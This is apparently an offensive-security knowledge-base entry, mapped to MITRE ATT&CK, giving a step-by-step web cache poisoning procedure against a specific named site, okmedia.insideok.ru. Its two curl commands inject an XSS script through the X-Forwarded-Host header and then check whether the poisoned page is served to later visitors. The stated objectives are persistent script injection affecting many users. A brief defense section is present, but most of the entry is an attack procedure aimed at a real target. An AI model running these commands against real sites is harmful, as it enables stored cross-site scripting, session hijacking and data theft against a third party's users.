---
tags:
  - web-cache-poisoning
  - injection
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-xss-payload]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 80d8c6c4-5a63-4c00-a228-07039814dc87
created_at: '2025-12-13T09:00:33.966Z'
updated_at: '2025-12-13T09:00:33.966Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject Malicious Host for Cache Poisoning

## Summary

This procedure injects a malicious host value via the X-Forwarded-Host header to poison the web cache on okmedia.insideok.ru, embedding an XSS payload for persistent execution.

## Description

By crafting a request with a malicious host containing an XSS script, the cache is poisoned, causing the server to store and serve the payload to subsequent users. This exploits improper header validation and can lead to session hijacking or data theft. The target is a web application with caching, and success depends on the cache not validating inputs.

## Requirements

1. Confirmed vulnerability from prior testing
2. Ability to send custom HTTP headers
3. Knowledge of XSS payload construction

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all forwarded headers
- Implement cache segmentation and monitor for suspicious payloads in requests

## Objectives

1. Poison the cache with malicious content
2. Embed stored XSS for multi-user impact
3. Achieve persistent script injection

## Instructions

### Step 1: Craft and Send Injection Request

**Context**: Send a request with the malicious host including an XSS payload.

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
curl -H "X-Forwarded-Host: \"><script>alert('XSS')</script>" https://okmedia.insideok.ru/
```

> This injects the script into the host value, poisoning the cache if vulnerable.

### Step 2: Confirm Injection Success

**Context**: Make a follow-up request to verify if the cache now serves the poisoned response.

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
curl https://okmedia.insideok.ru/ | grep "<script>alert('XSS')</script>"
```

> Check if the payload appears in the response, indicating successful poisoning.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-inject-xss-payload]]

## Tools Used

- [[tools/curl]]

## Tags

- web-cache-poisoning
- injection
